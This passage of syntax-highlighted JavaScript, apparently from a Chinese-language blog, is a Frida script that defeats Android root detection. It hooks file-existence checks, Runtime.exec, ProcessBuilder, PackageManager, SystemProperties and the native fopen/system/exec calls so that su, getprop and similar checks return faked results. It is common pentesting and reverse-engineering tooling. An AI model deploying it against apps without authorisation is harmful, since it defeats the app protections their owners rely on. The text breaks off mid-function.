class="hljs-keyword">var</span> NativeFile = Java.use(<span class="hljs-string">&#x27;java.io.File&#x27;</span>);<br>    NativeFile.exists.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <br>        <span class="hljs-keyword">var</span> name = NativeFile.getName.call(<span class="hljs-built_in">this</span>);<br>          <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;HOOK exists: &quot;</span>+name)<br>        <span class="hljs-keyword">if</span> (RootBinaries.indexOf(name) &gt; -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:exists() parameter: &quot;</span>+name);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.exists.call(<span class="hljs-built_in">this</span>);<br>        &#125;<br>    &#125;;<br><br><br>  <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过判断系统是否为发行版本来检测环境</span><br><span class="hljs-comment">     * HOOK String.contains</span><br><span class="hljs-comment">     * 如果对比的字符串为test-keys,意味者检测系统是否是为发行版本release-keys</span><br><span class="hljs-comment">     * 此处过滤不够严格，代码有可能会通过  String.contains(&quot;release-keys&quot;)进行检测</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">String</span> = Java.use(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br>    <span class="hljs-built_in">String</span>.contains.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">name</span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (name == <span class="hljs-string">&quot;test-keys&quot;</span>) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] test-keys check Bypass&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.contains.call(<span class="hljs-built_in">this</span>, name);<br>    &#125;;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 根据入参判断是否可以匹配设置的黑名单</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isRootCheck</span>(<span class="hljs-params">cmd</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> fakeCmd;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;cmd isRootCheck: &quot;</span>+cmd)<br>        <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span> || cmd == <span class="hljs-string">&quot;sh&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;which&quot;</span>) != -<span class="hljs-number">1</span> ) &#123;<br>            fakeCmd = <span class="hljs-string">&quot;grep&quot;</span>;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] cmd Bypass parameter:&quot;</span>+cmd);<br>            <span class="hljs-keyword">return</span> fakeCmd;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>            fakeCmd = <span class="hljs-string">&quot;justalled&quot;</span>;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] cmd Bypass parameter:&quot;</span>+cmd);<br>            <span class="hljs-keyword">return</span> fakeCmd;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取重载方法所有入参类型,从而可以实现hook所有重载方法</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param <span class="hljs-type">&#123;class&#125;</span></span>&#125; toHook </span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_implementations</span>(<span class="hljs-params">toHook</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> imp_args = []<br>        toHook.overloads.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">impl, _</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (impl.hasOwnProperty(<span class="hljs-string">&#x27;argumentTypes&#x27;</span>)) &#123;<br>                <span class="hljs-keyword">var</span> args = [];<br>                <span class="hljs-keyword">var</span> argTypes = impl.argumentTypes<br>                argTypes.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arg_type, __</span>) </span>&#123;<br>                    args.push(arg_type.className)<br>                &#125;);<br>                imp_args.push(args);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> imp_args;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过java.lang.Runtime.exec执行命令的方式来检测环境</span><br><span class="hljs-comment">     * HOOK java.lang.Runtime.exec下的所有重载方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> Runtime = Java.use(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>);<br>    <span class="hljs-keyword">var</span> execImplementations = get_implementations(Runtime.exec)<br>    <span class="hljs-keyword">var</span> exec = Runtime.exec.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>)<br><br>    execImplementations.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args, _</span>) </span>&#123;<br>        Runtime.exec.overload.apply(<span class="hljs-literal">null</span>, args).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> fakeCmd;<br>            <span class="hljs-comment">//此处也可以使用 Array.prototype.slice作用是获取arguments数组里的所有参数</span><br>            <span class="hljs-comment">//注arguments里就是重载方法的入参值，arguments为隐含变量由frida提供</span><br>            <span class="hljs-keyword">var</span> argz = [].slice.call(<span class="hljs-built_in">arguments</span>);<br>            <span class="hljs-keyword">var</span> cmd = argz[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> cmd === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>                fakeCmd = isRootCheck(cmd);<br>                <span class="hljs-keyword">if</span> (fakeCmd) &#123;<br>                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook Runtime.exec string cmd Bypass parameter:&quot;</span>+cmd);<br>                    <span class="hljs-keyword">return</span> exec.call(<span class="hljs-built_in">this</span>, fakeCmd);<br>                &#125;<br>            <span class="hljs-comment">//判断cmd是否为String数组</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> cmd === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cmd.length; i = i + <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">var</span> tmp_cmd = cmd[i];<br>                    fakeCmd = isRootCheck(tmp_cmd);<br>                    <span class="hljs-keyword">if</span> (fakeCmd) &#123;<br>                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook Runtime.exec object cmd Bypass parameter:&quot;</span>+cmd);<br>                        <span class="hljs-keyword">return</span> exec.call(<span class="hljs-built_in">this</span>, <span class="hljs-string">&#x27;aba&#x27;</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>[<span class="hljs-string">&#x27;exec&#x27;</span>].apply(<span class="hljs-built_in">this</span>, argz);<br>        &#125;;<br>    &#125;);<br><br>    <span class="hljs-comment">// BufferedReader checkLine check</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过读取/system/build.prop中ro.build.tags的值来检测环境</span><br><span class="hljs-comment">     * HOOK java.io.BufferedReader.readLine如果读取内容包含ro.build.tags=test-keys则替换为ro.build.tags=release-keys</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// var BufferedReader = Java.use(&#x27;java.io.BufferedReader&#x27;);</span><br>    <span class="hljs-comment">// BufferedReader.readLine.overload().implementation = function () &#123;</span><br>    <span class="hljs-comment">//     var text = this.readLine.call(this);</span><br>    <span class="hljs-comment">//     console.log(text)</span><br>    <span class="hljs-comment">//     if (text === null) &#123;</span><br>    <span class="hljs-comment">//         // just pass , i know it&#x27;s ugly as hell but test != null won&#x27;t work :(</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         var shouldFakeRead = (text.indexOf(&quot;ro.build.tags=test-keys&quot;) &gt; -1);</span><br>    <span class="hljs-comment">//         if (shouldFakeRead) &#123;</span><br>    <span class="hljs-comment">//             send(&quot;[RootDetection Bypass] build.prop file read&quot;);</span><br>    <span class="hljs-comment">//             console.log(&quot;[*] build.prop file read parameter:&quot;+text);</span><br>    <span class="hljs-comment">//             text = text.replace(&quot;ro.build.tags=test-keys&quot;, &quot;ro.build.tags=release-keys&quot;);</span><br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     return text;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 启动一个进程来使用命令如:getprop、id、mount等来检测环境</span><br><span class="hljs-comment">     * HOOK java.lang.ProcessBuilder.start方法</span><br><span class="hljs-comment">     * 通过hook start方法调用该对象内的command方法返回即将执行的命令:List&lt;String&gt; command</span><br><span class="hljs-comment">     * 遍历command是否与黑名单匹配</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> ProcessBuilder = Java.use(<span class="hljs-string">&#x27;java.lang.ProcessBuilder&#x27;</span>);<br>    ProcessBuilder.start.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> cmd = <span class="hljs-built_in">this</span>.command.call(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">var</span> shouldModifyCommand = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cmd.size(); i = i + <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">var</span> tmp_cmd = cmd.get(i).toString();<br>            <span class="hljs-keyword">if</span> (tmp_cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || tmp_cmd.indexOf(<span class="hljs-string">&quot;mount&quot;</span>) != -<span class="hljs-number">1</span> || tmp_cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || tmp_cmd.indexOf(<span class="hljs-string">&quot;id&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>                shouldModifyCommand = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (shouldModifyCommand) &#123;<br> <br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook ProcessBuilder cmd Bypass parameter:&quot;</span>+cmd);<br>            <span class="hljs-built_in">this</span>.command.call(<span class="hljs-built_in">this</span>, [<span class="hljs-string">&quot;grep&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.start.call(<span class="hljs-built_in">this</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;su&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]  hook ProcessBuilder cmd Bypass parameter:&quot;</span>+cmd);<br>            <span class="hljs-built_in">this</span>.command.call(<span class="hljs-built_in">this</span>, [<span class="hljs-string">&quot;juslled&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.start.call(<span class="hljs-built_in">this</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.start.call(<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// Patch other libraries after the above ones</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *  判断isInsideSecureHardware 硬件安全区检测</span><br><span class="hljs-comment">     *  通过getPackageInfo检测已安装的app的包名是否包含de.robv.android.xposed.installer、magsik等应用以此来检测环境</span><br><span class="hljs-comment">     *  通过android.os.SystemProperties.get方法获取ro.build.selinux、ro.debuggable等来检测系统环境</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">var</span> RootBypass = [&#123;<br>        <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;android.security.keystore.KeyInfo&#x27;</span>,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;isInsideSecureHardware&#x27;</span>,<br>        <span class="hljs-attr">func</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>            send(<span class="hljs-string">&quot;[RootDetection Bypass] isInsideSecureHardware&quot;</span>);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;isInsideSecureHardware Bypass&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;,<br>        <span class="hljs-attr">target</span>: <span class="hljs-number">6</span><br>    &#125;, &#123;<br>        <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;android.app.ApplicationPackageManager&#x27;</span>,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;getPackageInfo&#x27;</span>,<br>        <span class="hljs-attr">arguments</span>: [<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>],<br>        <span class="hljs-attr">func</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">pname, flags</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> shouldFakePackage = (RootPackages.indexOf(pname) &gt; -<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (shouldFakePackage) &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]  hook ApplicationPackageManager check for package:&quot;</span>+pname);<br>                pname = <span class="hljs-string">&quot;com.cola.zzzz&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getPackageInfo.call(<span class="hljs-built_in">this</span>, pname, flags);<br>        &#125;<br>    &#125;, &#123;<br>        <span class="hljs-attr">class</span>: <span class="hljs-string">&#x27;android.os.SystemProperties&#x27;</span>,<br>        <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,<br>        <span class="hljs-attr">arguments</span>: [<span class="hljs-string">&#x27;java.lang.String&#x27;</span>],<br>        <span class="hljs-attr">func</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">name</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (RootPropertiesKeys.indexOf(name) != -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]  hook SystemProperties  parameter:&quot;</span>+name);<br>                <span class="hljs-keyword">return</span> RootProperties[name];<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.get.call(<span class="hljs-built_in">this</span>, name);<br>        &#125;<br>    &#125;<br>    ]<br><br>    RootBypass.forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">bypass, _</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> toHook;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (bypass.target &amp;&amp; <span class="hljs-built_in">parseInt</span>(Java.androidVersion, <span class="hljs-number">10</span>) &lt; bypass.target) &#123;<br> <br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]  unavailable class/method - &quot;</span>+bypass.class + <span class="hljs-string">&#x27;.&#x27;</span> + bypass.method);<br>                <span class="hljs-keyword">return</span><br>            &#125;<br>            toHook = Java.use(bypass.class)[bypass.method];<br>            <span class="hljs-keyword">if</span> (!toHook) &#123;<br>               <br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]   Cannot find- &quot;</span>+bypass.class + <span class="hljs-string">&#x27;.&#x27;</span> + bypass.method);<br>                <span class="hljs-keyword">return</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*]  Error- &quot;</span>+bypass.class + <span class="hljs-string">&#x27;.&#x27;</span> + bypass.method+err);<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (bypass.arguments) &#123;<br>            toHook.overload.apply(<span class="hljs-literal">null</span>, bypass.arguments).implementation = bypass.func;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            toHook.overload.implementation = bypass.func;<br>        &#125;<br>    &#125;)<br><br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 通过C/C++代码来检测环境</span><br><span class="hljs-comment">     * HOOK fopen和system方法</span><br><span class="hljs-comment">     * 原方法使用Memory.writeUtf8String进行替换要查找的文件路径</span><br><span class="hljs-comment">     * 因为   *fopen(const char * __restrict __filename, const char * __restrict __mode) 的入参数被const修饰无法修改</span><br><span class="hljs-comment">     * 所以更改为 args[0] = Memory.alloc(1)来达到替换入参的目的</span><br><span class="hljs-comment">     */</span><br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fopen&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <br>            <span class="hljs-keyword">var</span> path = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <br>            path = path.split(<span class="hljs-string">&quot;/&quot;</span>);<br>            <span class="hljs-keyword">var</span> executable = path[path.length - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">var</span> shouldFakeReturn = (RootBinaries.indexOf(executable) &gt; -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> (shouldFakeReturn) &#123;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:fopen() parameter: &quot;</span>+path)<br>                args[<span class="hljs-number">0</span>] = Memory.alloc(<span class="hljs-number">1</span>)<br>                <span class="hljs-comment">// Memory.writeUtf8String(args[0], &quot;/notex ss&quot;);</span><br>                <span class="hljs-comment">// send(&quot;[RootDetection Bypass] native fopen&quot;);</span><br>                <br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;   <br> <br>        &#125;<br>    &#125;);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * HOOK open</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// Interceptor.attach(Module.findExportByName(&quot;libc.so&quot;, &quot;open&quot;), &#123;</span><br>    <span class="hljs-comment">//     onEnter: function (args) &#123;</span><br>            <br>    <span class="hljs-comment">//         var path = Memory.readCString(args[0]);</span><br>    <span class="hljs-comment">//         console.log(&quot;[*] hook:open() parameter: &quot;+path)</span><br>    <span class="hljs-comment">//         path = path.split(&quot;/&quot;);</span><br>    <span class="hljs-comment">//         var executable = path[path.length - 1];</span><br>    <span class="hljs-comment">//         var shouldFakeReturn = (RootBinaries.indexOf(executable) &gt; -1)</span><br>    <span class="hljs-comment">//         if (shouldFakeReturn) &#123;</span><br>    <span class="hljs-comment">//             args[0] = Memory.alloc(1)</span><br>                <br>    <span class="hljs-comment">//         &#125;</span><br>    <span class="hljs-comment">//     &#125;,</span><br>    <span class="hljs-comment">//     onLeave: function (retval) &#123;</span><br>      <br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;);</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Exec Family</span><br><span class="hljs-comment">     */</span><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:system() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execl&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter: &quot;</span>+cmd)<br><br><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter1: &quot;</span>+ Memory.readCString(args[<span class="hljs-number">1</span>]))<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter2: &quot;</span>+ Memory.readCString(args[<span class="hljs-number">2</span>]))<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter3: &quot;</span>+ Memory.readCString(args[<span class="hljs-number">3</span>]))<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;netstat&quot;</span>) != -<span class="hljs-number">1</span> ) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grepx&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execlp&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execlp() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execve&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execve() parameter: &quot;</span>+cmd)<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter: &quot;</span>+ Memory.readCString(args[<span class="hljs-number">1</span>]))<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execl() parameter: &quot;</span>+ Memory.readCString(args[<span class="hljs-number">2</span>]))<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;netstat&quot;</span>) != -<span class="hljs-number">1</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execle&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execle() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;grep&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-string">&quot;su&quot;</span>) &#123;<br>                Memory.writeUtf8String(args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;justafaled&quot;</span>);<br>            &#125;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) </span>&#123;<br><br>        &#125;<br><br>    &#125;);<br><br><br>    Interceptor.attach(Module.findExportByName(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;execlpe&quot;</span>), &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> cmd = Memory.readCString(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] hook:execlpe() parameter: &quot;</span>+cmd)<br>            <span class="hljs-keyword">if</span> (cmd.indexOf(<span class="hljs-string">&quot;getprop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;mount&quot;</span> || cmd.indexOf(<span class="hljs-string">&quot;build.prop&quot;</span>) != -<span class="hljs-number">1</span> || cmd == <span class="hljs-string">&quot;id&quot;</span>) &#123;           <br>                